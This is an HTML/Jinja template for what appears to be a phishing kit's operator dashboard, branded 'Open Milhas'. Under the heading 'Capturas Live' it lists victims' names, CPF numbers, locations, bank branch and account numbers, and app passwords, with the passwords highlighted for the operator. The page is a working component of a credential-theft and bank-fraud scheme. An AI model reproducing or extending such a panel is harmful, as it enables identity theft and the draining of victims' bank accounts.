<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Master Admin | Open Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
    <style>
        body { background: #0a1128; color: #fff; font-family: 'Inter', sans-serif; }
        .sidebar { background: #111d40; min-height: 100vh; padding: 30px 15px; border-right: 1px solid #1e2d5a; }
        .main-card { background: #111d40; border-radius: 15px; border: 1px solid #1e2d5a; padding: 25px; margin-top: 20px; }
        .table { color: #cbd5e1; border-color: #1e2d5a; }
        .table thead { background: #0a1128; color: #c5a059; }
        .status-badge { background: #00c853; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.75rem; }
        .pass-text { color: #ff5252; font-family: monospace; font-weight: bold; background: rgba(255,82,82,0.1); padding: 4px 8px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 sidebar">
                <h4 class="fw-bold mb-5 text-center">OPEN <span style="color:#c5a059">ADMIN</span></h4>
                <nav class="nav flex-column">
                    <a class="nav-link text-white active" href="#"><i class="fas fa-bolt me-2 text-warning"></i> Capturas Live</a>
                    <a class="nav-link text-muted" href="#"><i class="fas fa-history me-2"></i> Logs do Sistema</a>
                </nav>
            </div>
            <div class="col-md-10 p-5">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h2>Monitor de Atividade</h2>
                    <span class="status-badge"><i class="fas fa-circle me-2 animate-pulse"></i> Servidor Online</span>
                </div>

                <div class="main-card">
                    <div class="table-responsive">
                        <table class="table align-middle">
                            <thead>
                                <tr>
                                    <th>Data/Hora</th><th>Cliente</th><th>CPF</th><th>Localização</th><th>Bancário</th><th>Senha App</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for u in usuarios %}
                                <tr>
                                    <td class="small">Recente</td>
                                    <td><i class="fas fa-user-circle me-2"></i><b>{{ u[1] }}</b></td>
                                    <td>{{ u[2] }}</td>
                                    <td><small>{{ u[4] }} - {{ u[3] }}</small></td>
                                    <td><i class="fas fa-university me-1"></i> Ag: {{ u[5] }} / CC: {{ u[6] }}</td>
                                    <td><span class="pass-text">{{ u[7] }}</span></td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
